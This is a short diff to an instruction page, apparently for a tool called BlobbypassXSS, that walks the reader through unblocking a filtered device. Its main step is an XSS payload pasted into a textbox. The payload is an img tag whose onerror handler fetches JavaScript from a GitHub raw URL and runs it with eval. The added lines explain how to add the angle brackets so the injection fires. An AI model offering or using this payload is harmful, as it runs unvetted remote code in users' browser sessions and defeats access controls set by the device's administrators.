@@ -13,6 +13,11 @@ Then, click the green document button.
 
 In the textbox, paste the following string:
 
-img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '
+ img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '
+
+ At the beginning of the string, put a less than sign < 
+ At the end of the string, type a greater than sign >
+
+Paste the whole thing, not just the blue.
 
 Unblocked!
